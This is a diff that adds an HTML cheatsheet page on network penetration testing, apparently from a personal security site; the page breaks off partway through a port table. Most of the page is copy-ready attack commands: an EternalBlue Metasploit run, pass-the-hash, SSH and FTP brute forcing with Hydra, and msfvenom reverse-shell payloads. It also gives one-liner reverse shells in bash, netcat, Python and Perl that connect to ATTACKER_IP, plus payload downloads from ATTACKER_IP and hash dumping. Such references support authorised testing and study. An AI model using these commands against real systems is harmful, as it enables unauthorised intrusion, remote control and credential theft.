@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network Penetration | Renvector Cheatsheets</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f; --bg2: #111118; --bg3: #1a1a24;
+    --border: #2a2a3a; --accent: #3b82f6; --accent2: #60a5fa;
+    --green: #22d3a5; --yellow: #f59e0b; --red: #ef4444; --purple: #a78bfa;
+    --text: #e2e8f0; --text2: #94a3b8; --text3: #64748b;
+    --mono: 'JetBrains Mono', monospace; --sans: 'Inter', sans-serif;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; line-height: 1.6; }
+  nav { position: sticky; top: 0; z-index: 100; background: rgba(10,10,15,0.9); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); padding: 0 2rem; display: flex; align-items: center; justify-content: space-between; height: 56px; }
+  .nav-logo { font-family: var(--mono); font-size: 1rem; color: var(--text); text-decoration: none; }
+  .nav-logo span { color: var(--accent); }
+  .nav-links { display: flex; gap: 2rem; }
+  .nav-links a { color: var(--text2); text-decoration: none; font-size: .875rem; transition: color .2s; }
+  .nav-links a:hover { color: var(--text); }
+  .page-header { border-bottom: 1px solid var(--border); padding: 3rem 2rem 2.5rem; max-width: 1100px; margin: 0 auto; }
+  .breadcrumb { font-family: var(--mono); font-size: .75rem; color: var(--text3); margin-bottom: 1rem; }
+  .breadcrumb span { color: var(--accent); }
+  .page-header h1 { font-size: 2rem; font-weight: 600; margin-bottom: .75rem; display: flex; align-items: center; gap: .75rem; }
+  .page-icon { width: 40px; height: 40px; border-radius: 8px; background: rgba(59,130,246,.15); border: 1px solid rgba(59,130,246,.3); display: flex; align-items: center; justify-content: center; font-size: 1.1rem; }
+  .page-header p { color: var(--text2); font-size: .95rem; max-width: 640px; }
+  .tag-row { display: flex; flex-wrap: wrap; gap: .5rem; margin-top: 1rem; }
+  .tag { font-family: var(--mono); font-size: .7rem; background: var(--bg3); border: 1px solid var(--border); padding: .25rem .6rem; border-radius: 4px; color: var(--text2); }
+  .layout { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: 220px 1fr; gap: 0; }
+  .sidebar { border-right: 1px solid var(--border); padding: 2rem 1.5rem; position: sticky; top: 56px; height: calc(100vh - 56px); overflow-y: auto; }
+  .sidebar-label { font-family: var(--mono); font-size: .65rem; color: var(--text3); letter-spacing: .1em; text-transform: uppercase; margin-bottom: 1rem; }
+  .sidebar nav { display: flex; flex-direction: column; gap: .25rem; }
+  .sidebar nav a { font-size: .8rem; color: var(--text2); text-decoration: none; padding: .4rem .75rem; border-radius: 5px; border-left: 2px solid transparent; transition: all .15s; }
+  .sidebar nav a:hover { color: var(--text); background: var(--bg3); border-left-color: var(--border); }
+  .sidebar nav a.active { color: var(--accent2); background: rgba(59,130,246,.08); border-left-color: var(--accent); }
+  .content { padding: 2rem 2.5rem; }
+  .section { margin-bottom: 3rem; }
+  .section-title { font-size: 1.1rem; font-weight: 600; display: flex; align-items: center; gap: .6rem; margin-bottom: 1.5rem; padding-bottom: .75rem; border-bottom: 1px solid var(--border); }
+  .section-title .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
+  .section-num { font-family: var(--mono); font-size: .7rem; color: var(--accent); background: rgba(59,130,246,.1); padding: .2rem .5rem; border-radius: 4px; }
+  .cmd-group { margin-bottom: 1.75rem; }
+  .cmd-group-title { font-family: var(--mono); font-size: .75rem; color: var(--green); margin-bottom: .6rem; letter-spacing: .05em; }
+  .cmd-block { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+  .cmd-block-header { display: flex; align-items: center; justify-content: space-between; padding: .5rem .9rem; background: var(--bg3); border-bottom: 1px solid var(--border); }
+  .cmd-block-label { font-family: var(--mono); font-size: .7rem; color: var(--text3); }
+  .copy-btn { font-family: var(--mono); font-size: .65rem; color: var(--text3); background: none; border: 1px solid var(--border); padding: .15rem .5rem; border-radius: 3px; cursor: pointer; transition: all .15s; }
+  .copy-btn:hover { color: var(--accent2); border-color: var(--accent); }
+  .copy-btn.copied { color: var(--green); border-color: var(--green); }
+  pre { padding: .9rem 1rem; font-family: var(--mono); font-size: .78rem; color: var(--text); line-height: 1.7; overflow-x: auto; white-space: pre; }
+  .c-comment { color: var(--text3); }
+  .c-cmd { color: var(--accent2); }
+  .c-flag { color: var(--yellow); }
+  .c-val { color: var(--green); }
+  .c-warn { color: var(--red); }
+  .c-purple { color: var(--purple); }
+  .note { background: rgba(59,130,246,.06); border: 1px solid rgba(59,130,246,.2); border-left: 3px solid var(--accent); border-radius: 0 6px 6px 0; padding: .75rem 1rem; font-size: .8rem; color: var(--text2); margin-bottom: 1.25rem; }
+  .note strong { color: var(--accent2); }
+  .warn-note { background: rgba(245,158,11,.06); border: 1px solid rgba(245,158,11,.2); border-left: 3px solid var(--yellow); border-radius: 0 6px 6px 0; padding: .75rem 1rem; font-size: .8rem; color: var(--text2); margin-bottom: 1.25rem; }
+  .warn-note strong { color: var(--yellow); }
+  .ref-table { width: 100%; border-collapse: collapse; margin-bottom: 1.5rem; }
+  .ref-table th { text-align: left; font-family: var(--mono); font-size: .7rem; color: var(--text3); padding: .5rem .75rem; border-bottom: 1px solid var(--border); letter-spacing: .08em; }
+  .ref-table td { padding: .55rem .75rem; font-size: .82rem; border-bottom: 1px solid rgba(42,42,58,.5); vertical-align: top; }
+  .ref-table td:first-child { font-family: var(--mono); color: var(--accent2); font-size: .75rem; }
+  .ref-table td:last-child { color: var(--text2); }
+  .ref-table tr:last-child td { border-bottom: none; }
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+</style>
+</head>
+<body>
+<nav>
+  <a href="../index.html" class="nav-logo">&lt;<span>Renvector</span>/&gt;</a>
+  <div class="nav-links">
+    <a href="../index.html#about">About</a>
+    <a href="../index.html#cheatsheets">Cheatsheets</a>
+    <a href="../index.html#skills">Skills</a>
+    <a href="../index.html#contact">Contact</a>
+  </div>
+</nav>
+
+<div class="page-header">
+  <div class="breadcrumb">cheatsheets / <span>network-penetration</span></div>
+  <h1><div class="page-icon">📡</div>Network Penetration</h1>
+  <p>Host discovery, service enumeration, exploitation, pivoting, and post-exploitation techniques.</p>
+  <div class="tag-row">
+    <span class="tag">Nmap</span><span class="tag">Metasploit</span><span class="tag">Wireshark</span>
+    <span class="tag">Hydra</span><span class="tag">enum4linux</span><span class="tag">NetExec</span>
+  </div>
+</div>
+
+<div class="layout">
+  <aside class="sidebar">
+    <div class="sidebar-label">Sections</div>
+    <nav>
+      <a href="#discovery" class="active">01. Host Discovery</a>
+      <a href="#portscan">02. Port Scanning</a>
+      <a href="#services">03. Service Enum</a>
+      <a href="#smb">04. SMB Attacks</a>
+      <a href="#ftp">05. FTP / SSH</a>
+      <a href="#msf">06. Metasploit</a>
+      <a href="#shells">07. Shells</a>
+      <a href="#postex">08. Post-Exploitation</a>
+      <a href="#ports">09. Port Reference</a>
+    </nav>
+  </aside>
+
+  <main class="content">
+
+    <!-- 01 HOST DISCOVERY -->
+    <section class="section" id="discovery">
+      <div class="section-title"><div class="dot"></div><span class="section-num">01</span>Host Discovery</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Ping Sweep</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Nmap ping sweep (no port scan)</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-sn</span> <span class="c-val">192.168.1.0/24</span>
+
+<span class="c-comment"># ARP scan (more reliable on LAN)</span>
+<span class="c-cmd">arp-scan</span> <span class="c-flag">-l</span>
+<span class="c-cmd">netdiscover</span> <span class="c-flag">-r</span> <span class="c-val">192.168.1.0/24</span>
+
+<span class="c-comment"># fping</span>
+<span class="c-cmd">fping</span> <span class="c-flag">-ag</span> <span class="c-val">192.168.1.0/24</span> <span class="c-val">2>/dev/null</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 02 PORT SCANNING -->
+    <section class="section" id="portscan">
+      <div class="section-title"><div class="dot"></div><span class="section-num">02</span>Port Scanning</div>
+
+      <div class="note"><strong>Workflow:</strong> Fast scan to find open ports → targeted scan with scripts on open ports only. Saves time.</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Nmap Scan Workflow</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Step 1 — Fast scan all ports</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-p-</span> <span class="c-flag">--open</span> <span class="c-flag">-T4</span> <span class="c-val">TARGET_IP</span> <span class="c-flag">-oN</span> <span class="c-val">ports.txt</span>
+
+<span class="c-comment"># Step 2 — Deep scan open ports only</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-sC</span> <span class="c-flag">-sV</span> <span class="c-flag">-p</span> <span class="c-val">22,80,443,445</span> <span class="c-val">TARGET_IP</span> <span class="c-flag">-oN</span> <span class="c-val">detailed.txt</span>
+
+<span class="c-comment"># UDP scan (top 100 — slower)</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-sU</span> <span class="c-flag">--top-ports</span> <span class="c-val">100</span> <span class="c-val">TARGET_IP</span>
+
+<span class="c-comment"># OS detection + aggressive</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-A</span> <span class="c-flag">-O</span> <span class="c-val">TARGET_IP</span>
+
+<span class="c-comment"># Vulnerability scripts</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">--script vuln</span> <span class="c-val">TARGET_IP</span>
+
+<span class="c-comment"># Stealth SYN scan</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-sS</span> <span class="c-val">TARGET_IP</span>
+
+<span class="c-comment"># Scan with no ping (host may block ping)</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-Pn</span> <span class="c-flag">-sV</span> <span class="c-val">TARGET_IP</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Nmap Output Flags</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-flag">-oN</span> <span class="c-val">out.txt</span>    <span class="c-comment"># normal text output</span>
+<span class="c-flag">-oX</span> <span class="c-val">out.xml</span>    <span class="c-comment"># XML output (for Metasploit import)</span>
+<span class="c-flag">-oG</span> <span class="c-val">out.gnmap</span>  <span class="c-comment"># grepable output</span>
+<span class="c-flag">-oA</span> <span class="c-val">out</span>        <span class="c-comment"># all three at once</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 03 SERVICE ENUM -->
+    <section class="section" id="services">
+      <div class="section-title"><div class="dot"></div><span class="section-num">03</span>Service Enumeration</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># HTTP / Web Service</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">curl</span> <span class="c-flag">-I</span> <span class="c-val">http://TARGET_IP</span>               <span class="c-comment"># banner grab</span>
+<span class="c-cmd">whatweb</span> <span class="c-val">http://TARGET_IP</span>              <span class="c-comment"># tech detection</span>
+<span class="c-cmd">nikto</span> <span class="c-flag">-h</span> <span class="c-val">http://TARGET_IP</span>             <span class="c-comment"># web vuln scan</span>
+<span class="c-cmd">gobuster dir</span> <span class="c-flag">-u</span> <span class="c-val">http://TARGET_IP</span> <span class="c-flag">-w</span> <span class="c-val">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># SMTP Enumeration (port 25)</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">nc</span> <span class="c-val">TARGET_IP</span> <span class="c-val">25</span>
+<span class="c-comment"># Then type:</span>
+<span class="c-val">EHLO test</span>
+<span class="c-val">VRFY root</span>      <span class="c-comment"># user enumeration</span>
+<span class="c-val">EXPN root</span>
+
+<span class="c-comment"># smtp-user-enum tool</span>
+<span class="c-cmd">smtp-user-enum</span> <span class="c-flag">-M</span> <span class="c-val">VRFY</span> <span class="c-flag">-U</span> <span class="c-val">users.txt</span> <span class="c-flag">-t</span> <span class="c-val">TARGET_IP</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># SNMP Enumeration (port 161 UDP)</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">snmp-check</span> <span class="c-val">TARGET_IP</span>
+<span class="c-cmd">snmpwalk</span> <span class="c-flag">-c</span> <span class="c-val">public</span> <span class="c-flag">-v1</span> <span class="c-val">TARGET_IP</span>
+<span class="c-cmd">onesixtyone</span> <span class="c-flag">-c</span> <span class="c-val">/usr/share/seclists/Discovery/SNMP/snmp.txt</span> <span class="c-val">TARGET_IP</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 04 SMB -->
+    <section class="section" id="smb">
+      <div class="section-title"><div class="dot"></div><span class="section-num">04</span>SMB Attacks (port 139/445)</div>
+
+      <div class="warn-note"><strong>Key target:</strong> SMB is gold. Always check for null sessions, readable shares, and EternalBlue (MS17-010).</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># SMB Enumeration</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># enum4linux — full enum</span>
+<span class="c-cmd">enum4linux</span> <span class="c-flag">-a</span> <span class="c-val">TARGET_IP</span>
+
+<span class="c-comment"># List shares</span>
+<span class="c-cmd">smbclient</span> <span class="c-flag">-L</span> <span class="c-val">//TARGET_IP/</span> <span class="c-flag">-N</span>    <span class="c-comment"># null session</span>
+<span class="c-cmd">smbmap</span> <span class="c-flag">-H</span> <span class="c-val">TARGET_IP</span>
+
+<span class="c-comment"># Connect to share</span>
+<span class="c-cmd">smbclient</span> <span class="c-val">//TARGET_IP/sharename</span> <span class="c-flag">-N</span>
+
+<span class="c-comment"># NetExec (modern CrackMapExec replacement)</span>
+<span class="c-cmd">nxc smb</span> <span class="c-val">TARGET_IP</span> <span class="c-flag">-u</span> <span class="c-val">''</span> <span class="c-flag">-p</span> <span class="c-val">''</span> <span class="c-flag">--shares</span>
+<span class="c-cmd">nxc smb</span> <span class="c-val">TARGET_IP</span> <span class="c-flag">-u</span> <span class="c-val">admin</span> <span class="c-flag">-p</span> <span class="c-val">password</span>
+
+<span class="c-comment"># Nmap SMB scripts</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">--script</span> <span class="c-val">smb-enum-shares,smb-enum-users</span> <span class="c-flag">-p</span> <span class="c-val">445</span> <span class="c-val">TARGET_IP</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">--script</span> <span class="c-val">smb-vuln-ms17-010</span> <span class="c-flag">-p</span> <span class="c-val">445</span> <span class="c-val">TARGET_IP</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># EternalBlue (MS17-010) — Metasploit</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">msf</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">use</span> <span class="c-val">exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="c-cmd">set</span> <span class="c-val">RHOSTS TARGET_IP</span>
+<span class="c-cmd">set</span> <span class="c-val">LHOST ATTACKER_IP</span>
+<span class="c-cmd">set</span> <span class="c-val">PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span class="c-cmd">run</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Pass the Hash</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">nxc smb</span> <span class="c-val">TARGET_IP</span> <span class="c-flag">-u</span> <span class="c-val">Administrator</span> <span class="c-flag">-H</span> <span class="c-val">NTLM_HASH</span>
+<span class="c-cmd">impacket-psexec</span> <span class="c-val">Administrator@TARGET_IP</span> <span class="c-flag">-hashes</span> <span class="c-val">:NTLM_HASH</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 05 FTP/SSH -->
+    <section class="section" id="ftp">
+      <div class="section-title"><div class="dot"></div><span class="section-num">05</span>FTP / SSH</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># FTP (port 21)</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Try anonymous login first</span>
+<span class="c-cmd">ftp</span> <span class="c-val">TARGET_IP</span>
+<span class="c-comment"># Username: anonymous  |  Password: (blank or anonymous@)</span>
+
+<span class="c-comment"># Nmap FTP scripts</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">--script</span> <span class="c-val">ftp-anon,ftp-bounce,ftp-syst</span> <span class="c-flag">-p</span> <span class="c-val">21</span> <span class="c-val">TARGET_IP</span>
+
+<span class="c-comment"># Brute force FTP</span>
+<span class="c-cmd">hydra</span> <span class="c-flag">-l</span> <span class="c-val">admin</span> <span class="c-flag">-P</span> <span class="c-val">/usr/share/wordlists/rockyou.txt</span> <span class="c-val">ftp://TARGET_IP</span>
+
+<span class="c-comment"># Download all files from FTP</span>
+<span class="c-cmd">wget</span> <span class="c-flag">-m</span> <span class="c-flag">--no-passive</span> <span class="c-val">ftp://anonymous:@TARGET_IP</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># SSH (port 22)</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Basic connect</span>
+<span class="c-cmd">ssh</span> <span class="c-val">user@TARGET_IP</span>
+<span class="c-cmd">ssh</span> <span class="c-flag">-p</span> <span class="c-val">2222</span> <span class="c-val">user@TARGET_IP</span>      <span class="c-comment"># non-standard port</span>
+
+<span class="c-comment"># Connect with private key</span>
+<span class="c-cmd">ssh</span> <span class="c-flag">-i</span> <span class="c-val">id_rsa</span> <span class="c-val">user@TARGET_IP</span>
+<span class="c-cmd">chmod 600</span> <span class="c-val">id_rsa</span>                  <span class="c-comment"># required before using key</span>
+
+<span class="c-comment"># Brute force SSH</span>
+<span class="c-cmd">hydra</span> <span class="c-flag">-l</span> <span class="c-val">root</span> <span class="c-flag">-P</span> <span class="c-val">rockyou.txt</span> <span class="c-val">ssh://TARGET_IP</span>
+<span class="c-cmd">hydra</span> <span class="c-flag">-L</span> <span class="c-val">users.txt</span> <span class="c-flag">-P</span> <span class="c-val">rockyou.txt</span> <span class="c-val">ssh://TARGET_IP</span> <span class="c-flag">-t</span> <span class="c-val">4</span>
+
+<span class="c-comment"># SSH version banner</span>
+<span class="c-cmd">nc</span> <span class="c-val">TARGET_IP</span> <span class="c-val">22</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 06 MSF -->
+    <section class="section" id="msf">
+      <div class="section-title"><div class="dot"></div><span class="section-num">06</span>Metasploit Framework</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Core Workflow</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">msf</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Start Metasploit</span>
+<span class="c-cmd">msfconsole</span>
+
+<span class="c-comment"># Search for modules</span>
+<span class="c-cmd">search</span> <span class="c-val">ms17-010</span>
+<span class="c-cmd">search</span> <span class="c-val">type:exploit platform:windows smb</span>
+
+<span class="c-comment"># Use module</span>
+<span class="c-cmd">use</span> <span class="c-val">0</span>                             <span class="c-comment"># use by number</span>
+<span class="c-cmd">use</span> <span class="c-val">exploit/multi/handler</span>          <span class="c-comment"># full path</span>
+
+<span class="c-comment"># Options</span>
+<span class="c-cmd">show options</span>
+<span class="c-cmd">set</span> <span class="c-val">RHOSTS TARGET_IP</span>
+<span class="c-cmd">set</span> <span class="c-val">LHOST ATTACKER_IP</span>
+<span class="c-cmd">set</span> <span class="c-val">LPORT 4444</span>
+<span class="c-cmd">set</span> <span class="c-val">PAYLOAD linux/x64/meterpreter/reverse_tcp</span>
+
+<span class="c-comment"># Run</span>
+<span class="c-cmd">run</span>  <span class="c-comment">(or exploit)</span>
+
+<span class="c-comment"># Import nmap scan</span>
+<span class="c-cmd">db_import</span> <span class="c-val">scan.xml</span>
+<span class="c-cmd">hosts</span>
+<span class="c-cmd">services</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Meterpreter Commands</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">meterpreter</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">sysinfo</span>                <span class="c-comment"># system info</span>
+<span class="c-cmd">getuid</span>                 <span class="c-comment"># current user</span>
+<span class="c-cmd">getsystem</span>              <span class="c-comment"># attempt privilege escalation</span>
+<span class="c-cmd">hashdump</span>               <span class="c-comment"># dump password hashes</span>
+<span class="c-cmd">shell</span>                  <span class="c-comment"># drop to OS shell</span>
+<span class="c-cmd">upload</span> <span class="c-val">file.exe</span>         <span class="c-comment"># upload file</span>
+<span class="c-cmd">download</span> <span class="c-val">/etc/passwd</span>   <span class="c-comment"># download file</span>
+<span class="c-cmd">ps</span>                     <span class="c-comment"># list processes</span>
+<span class="c-cmd">migrate</span> <span class="c-val">PID</span>            <span class="c-comment"># migrate to process</span>
+<span class="c-cmd">background</span>             <span class="c-comment"># background session</span>
+<span class="c-cmd">sessions -i</span> <span class="c-val">1</span>          <span class="c-comment"># re-enter session</span>
+<span class="c-cmd">run post/multi/recon/local_exploit_suggester</span>  <span class="c-comment"># find privesc</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># msfvenom — Payload Generation</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Windows reverse shell exe</span>
+<span class="c-cmd">msfvenom</span> <span class="c-flag">-p</span> <span class="c-val">windows/x64/meterpreter/reverse_tcp</span> <span class="c-val">LHOST=ATTACKER_IP LPORT=4444</span> <span class="c-flag">-f exe</span> <span class="c-flag">-o</span> <span class="c-val">shell.exe</span>
+
+<span class="c-comment"># Linux reverse shell elf</span>
+<span class="c-cmd">msfvenom</span> <span class="c-flag">-p</span> <span class="c-val">linux/x64/meterpreter/reverse_tcp</span> <span class="c-val">LHOST=ATTACKER_IP LPORT=4444</span> <span class="c-flag">-f elf</span> <span class="c-flag">-o</span> <span class="c-val">shell.elf</span>
+
+<span class="c-comment"># PHP webshell</span>
+<span class="c-cmd">msfvenom</span> <span class="c-flag">-p</span> <span class="c-val">php/meterpreter/reverse_tcp</span> <span class="c-val">LHOST=ATTACKER_IP LPORT=4444</span> <span class="c-flag">-f raw</span> <span class="c-flag">-o</span> <span class="c-val">shell.php</span>
+
+<span class="c-comment"># List payloads</span>
+<span class="c-cmd">msfvenom</span> <span class="c-flag">-l payloads</span> | <span class="c-cmd">grep</span> <span class="c-val">linux/x64</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 07 SHELLS -->
+    <section class="section" id="shells">
+      <div class="section-title"><div class="dot"></div><span class="section-num">07</span>Shells &amp; Listeners</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Netcat Reverse Shells</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Start listener (attacker)</span>
+<span class="c-cmd">nc</span> <span class="c-flag">-lvnp</span> <span class="c-val">4444</span>
+<span class="c-cmd">rlwrap nc</span> <span class="c-flag">-lvnp</span> <span class="c-val">4444</span>          <span class="c-comment"># with readline support</span>
+
+<span class="c-comment"># Bash</span>
+<span class="c-val">bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</span>
+
+<span class="c-comment"># Netcat (target)</span>
+<span class="c-cmd">nc</span> <span class="c-val">ATTACKER_IP</span> <span class="c-val">4444</span> <span class="c-flag">-e</span> <span class="c-val">/bin/sh</span>
+
+<span class="c-comment"># Python3</span>
+<span class="c-val">python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span>
+
+<span class="c-comment"># Perl</span>
+<span class="c-val">perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Upgrade Shell to Full TTY</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Step 1 — Spawn PTY</span>
+<span class="c-val">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+
+<span class="c-comment"># Step 2 — Background shell</span>
+<span class="c-val">Ctrl + Z</span>
+
+<span class="c-comment"># Step 3 — Fix terminal</span>
+<span class="c-cmd">stty raw</span> <span class="c-flag">-echo</span>
+<span class="c-cmd">fg</span>
+
+<span class="c-comment"># Step 4 — Fix size</span>
+<span class="c-cmd">export</span> <span class="c-val">TERM=xterm</span>
+<span class="c-cmd">stty rows</span> <span class="c-val">40</span> <span class="c-cmd">columns</span> <span class="c-val">180</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 08 POST-EX -->
+    <section class="section" id="postex">
+      <div class="section-title"><div class="dot"></div><span class="section-num">08</span>Post-Exploitation</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Linux — Basic Situational Awareness</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">id</span> && <span class="c-cmd">whoami</span>             <span class="c-comment"># current user</span>
+<span class="c-cmd">uname -a</span>                  <span class="c-comment"># kernel version</span>
+<span class="c-cmd">hostname</span>                  <span class="c-comment"># hostname</span>
+<span class="c-cmd">ip a</span>                      <span class="c-comment"># network interfaces</span>
+<span class="c-cmd">cat /etc/passwd</span>           <span class="c-comment"># local users</span>
+<span class="c-cmd">cat /etc/hosts</span>            <span class="c-comment"># internal hosts</span>
+<span class="c-cmd">ss -tnp</span>                   <span class="c-comment"># open connections</span>
+<span class="c-cmd">ps aux</span>                    <span class="c-comment"># running processes</span>
+<span class="c-cmd">env</span>                       <span class="c-comment"># environment variables</span>
+<span class="c-cmd">find / -name "*.txt" 2>/dev/null</span>  <span class="c-comment"># search files</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># File Transfer to Target</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Python HTTP server (attacker)</span>
+<span class="c-cmd">python3 -m http.server</span> <span class="c-val">8000</span>
+
+<span class="c-comment"># Download on target</span>
+<span class="c-cmd">wget</span> <span class="c-val">http://ATTACKER_IP:8000/linpeas.sh</span>
+<span class="c-cmd">curl</span> <span class="c-flag">-O</span> <span class="c-val">http://ATTACKER_IP:8000/linpeas.sh</span>
+
+<span class="c-comment"># Netcat file transfer</span>
+<span class="c-comment"># Receiver:</span>
+<span class="c-cmd">nc</span> <span class="c-flag">-lvnp</span> <span class="c-val">1234</span> > <span class="c-val">received_file</span>
+<span class="c-comment"># Sender:</span>
+<span class="c-cmd">nc</span> <span class="c-val">TARGET_IP</span> <span class="c-val">1234</span> < <span class="c-val">file_to_send</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 09 PORTS -->
+    <section class="section" id="ports">
+      <div class="section-title"><div class="dot"></div><span class="section-num">09</span>Common Port Reference</div>
+
+      <table class="ref-table">
+        <thead><tr><th>Port</th><th>Service</th><th>What to Check</th></tr></thead>
+        <tbody>
+          <tr><td>21</td><td>FTP</td><td>Anonymous login, writable dirs, version exploits</td></tr>
+          <tr><td>22</td><td>SSH</td><td>Weak creds, old version (libssh), key reuse</td></tr>
+          <tr><td>23</td><td>Telnet</td><td>Cleartext creds, default login</td></tr>
